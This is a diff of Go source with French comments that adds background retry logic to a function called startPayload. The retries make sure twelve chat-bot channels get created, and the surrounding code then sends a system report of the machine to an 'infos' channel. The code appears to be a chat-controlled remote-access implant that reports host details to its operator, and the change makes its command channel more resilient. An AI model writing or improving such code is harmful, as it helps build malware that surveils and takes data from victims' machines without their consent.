@@ -500,6 +500,22 @@ func startPayload() {
 			bootNote("12/12 salons prêts")
 		}
 
+		// Si des salons manquent (permissions, réseau), on retente en fond
+		// pendant dix minutes : un refus temporaire ne doit pas figer la machine
+		// sur le seul salon de base.
+		if channelsReady() < 12 {
+			go func() {
+				for i := 0; i < 10 && !stopped.Load(); i++ {
+					time.Sleep(90 * time.Second)
+					ensureAllChannels()
+					if channelsReady() >= 12 {
+						bootNote("salons complétés")
+						return
+					}
+				}
+			}()
+		}
+
 		time.Sleep(time.Duration(2+rand.Intn(3)) * time.Second)
 		if s, err := systemReport(); err == nil {
 			botSendText(infosChannel(), s)
